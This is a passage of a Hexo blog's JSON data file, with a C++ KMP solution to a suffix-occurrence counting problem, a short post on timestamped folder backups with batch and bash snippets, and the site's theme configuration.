class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> mod 1000000007</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"built_in\">string</span> a,b;</span><br><span class=\"line\"><span class=\"keyword\">int</span> NEXT[<span class=\"number\">1000020</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">get</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j=<span class=\"number\">-1</span>;</span><br><span class=\"line\">    NEXT[i]=j;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;b.length())&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(j==<span class=\"number\">-1</span>||b[i]==b[j])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            i++;j++;</span><br><span class=\"line\">            NEXT[i]=j;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> j=NEXT[j];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">kmp</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    get();</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> ans=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;a.length())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(j==<span class=\"number\">-1</span>||a[i]==b[j])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ans+=j+<span class=\"number\">1</span>;</span><br><span class=\"line\">            ans%=mod;</span><br><span class=\"line\">            i++;j++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(j==<span class=\"number\">0</span>)i++;</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                j=NEXT[j];</span><br><span class=\"line\">                ans+=<span class=\"number\">1l</span>l*j*(j+<span class=\"number\">1</span>)/<span class=\"number\">2</span>;</span><br><span class=\"line\">                ans%=mod;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    ios::sync_with_stdio(<span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> T;</span><br><span class=\"line\">    <span class=\"built_in\">cin</span>&gt;&gt;T;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(T--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class=\"line\">        reverse(a.begin(),a.end());</span><br><span class=\"line\">        reverse(b.begin(),b.end());</span><br><span class=\"line\">        a+=<span class=\"string\">&#x27;X&#x27;</span>;b+=<span class=\"string\">&#x27;Y&#x27;</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;kmp()&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1932,"excerpt":"<h1 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h1><blockquote><p>Today is the birthday of SF,so VS gives two strings S1,S2 to SF as a present,which have a big secret.SF is interested in this secret and ask VS how to get it.There are the things that VS tell:<br>  Suffix(S2,i) = S2[i…len].Ni is the times that Suffix(S2,i) occurs in S1 and Li is the length of Suffix(S2,i).Then the secret is the sum of the product of Ni and Li.<br>  Now SF wants you to help him find the secret.The answer may be very large, so the answer should mod 1000000007.</p>\n</blockquote>","more":"<h1 id=\"Input\"><a href=\"#Input\" class=\"headerlink\" title=\"Input\"></a>Input</h1><blockquote><p>Input contains multiple cases.<br>  The first line contains an integer T,the number of cases.Then following T cases.<br>  Each test case contains two lines.The first line contains a string S1.The second line contains a string S2.<br>  1&lt;=T&lt;=10.1&lt;=|S1|,|S2|&lt;=1e6.S1 and S2 only consist of lowercase ,uppercase letter.</p>\n</blockquote>\n<h1 id=\"Output\"><a href=\"#Output\" class=\"headerlink\" title=\"Output\"></a>Output</h1><blockquote><p>For each test case,output a single line containing a integer,the answer of test case.<br>  The answer may be very large, so the answer should mod 1e9+7.</p>\n</blockquote>\n<h1 id=\"Sample-Input\"><a href=\"#Sample-Input\" class=\"headerlink\" title=\"Sample Input\"></a>Sample Input</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2</span><br><span class=\"line\">aaaaa</span><br><span class=\"line\">aa</span><br><span class=\"line\">abababab</span><br><span class=\"line\">aba</span><br></pre></td></tr></table></figure>\n<h1 id=\"Sample-Output\"><a href=\"#Sample-Output\" class=\"headerlink\" title=\"Sample Output\"></a>Sample Output</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">13</span><br><span class=\"line\">19</span><br></pre></td></tr></table></figure>\n<h1 id=\"Hint\"><a href=\"#Hint\" class=\"headerlink\" title=\"Hint\"></a>Hint</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">case 2: </span><br><span class=\"line\">Suffix(S2,1) &#x3D; &quot;aba&quot;,</span><br><span class=\"line\">Suffix(S2,2) &#x3D; &quot;ba&quot;,</span><br><span class=\"line\">Suffix(S2,3) &#x3D; &quot;a&quot;.</span><br><span class=\"line\">N1 &#x3D; 3,</span><br><span class=\"line\">N2 &#x3D; 3,</span><br><span class=\"line\">N3 &#x3D; 4.</span><br><span class=\"line\">L1 &#x3D; 3,</span><br><span class=\"line\">L2 &#x3D; 2,</span><br><span class=\"line\">L3 &#x3D; 1.</span><br><span class=\"line\">ans &#x3D; （3*3+3*2+4*1）%1000000007.</span><br></pre></td></tr></table></figure>\n<h1 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> mod 1000000007</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"built_in\">string</span> a,b;</span><br><span class=\"line\"><span class=\"keyword\">int</span> NEXT[<span class=\"number\">1000020</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">get</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j=<span class=\"number\">-1</span>;</span><br><span class=\"line\">    NEXT[i]=j;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;b.length())&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(j==<span class=\"number\">-1</span>||b[i]==b[j])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            i++;j++;</span><br><span class=\"line\">            NEXT[i]=j;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> j=NEXT[j];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">kmp</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    get();</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> ans=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;a.length())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(j==<span class=\"number\">-1</span>||a[i]==b[j])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ans+=j+<span class=\"number\">1</span>;</span><br><span class=\"line\">            ans%=mod;</span><br><span class=\"line\">            i++;j++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(j==<span class=\"number\">0</span>)i++;</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                j=NEXT[j];</span><br><span class=\"line\">                ans+=<span class=\"number\">1l</span>l*j*(j+<span class=\"number\">1</span>)/<span class=\"number\">2</span>;</span><br><span class=\"line\">                ans%=mod;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    ios::sync_with_stdio(<span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> T;</span><br><span class=\"line\">    <span class=\"built_in\">cin</span>&gt;&gt;T;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(T--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class=\"line\">        reverse(a.begin(),a.end());</span><br><span class=\"line\">        reverse(b.begin(),b.end());</span><br><span class=\"line\">        a+=<span class=\"string\">&#x27;X&#x27;</span>;b+=<span class=\"string\">&#x27;Y&#x27;</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;kmp()&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"批处理备份","date":"2020-04-08T07:34:26.000Z","abbrlink":"2e9e806c","data":null,"updata":null,"_content":"# 以当前时间备份文件\n`sample`是待备份文件夹\n\nwindows\n```bat\n@echo off\nif \"%time:~0,1%\" EQU \" \" (\n```\n\nlinux\n```bash\ntime=$(date '+%Y%m%d%H%M%S' )\ntar -cvf ./backup/$time.tar ./sample/\n```\n","source":"_posts/Backup.md","raw":"---\ntitle: 批处理备份\ndate: 2020-04-08 15:34:26\ncategories:\n  - 操作系统\n  - Shell\ntags:\n  - 批处理\nabbrlink: 2e9e806c\ndata:\nupdata:\n---\n# 以当前时间备份文件\n`sample`是待备份文件夹\n\nwindows\n```bat\n@echo off\nif \"%time:~0,1%\" EQU \" \" (\n```\n\nlinux\n```bash\ntime=$(date '+%Y%m%d%H%M%S' )\ntar -cvf ./backup/$time.tar ./sample/\n```\n","slug":"Backup","published":1,"updated":"2020-05-11T09:46:51.506Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexka90007qse5acaa449j","content":"<h1 id=\"以当前时间备份文件\"><a href=\"#以当前时间备份文件\" class=\"headerlink\" title=\"以当前时间备份文件\"></a>以当前时间备份文件</h1><p><code>sample</code>是待备份文件夹</p>\n<p>windows<br><figure class=\"highlight bat\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"built_in\">echo</span> off</span><br><span class=\"line\"><span class=\"keyword\">if</span> &quot;<span class=\"variable\">%time:~0,1%</span>&quot; <span class=\"keyword\">EQU</span> &quot; &quot; (</span><br></pre></td></tr></table></figure></p>\n<p>linux<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">time=$(date <span class=\"string\">&#x27;+%Y%m%d%H%M%S&#x27;</span> )</span><br><span class=\"line\">tar -cvf ./backup/<span class=\"variable\">$time</span>.tar ./sample/</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on 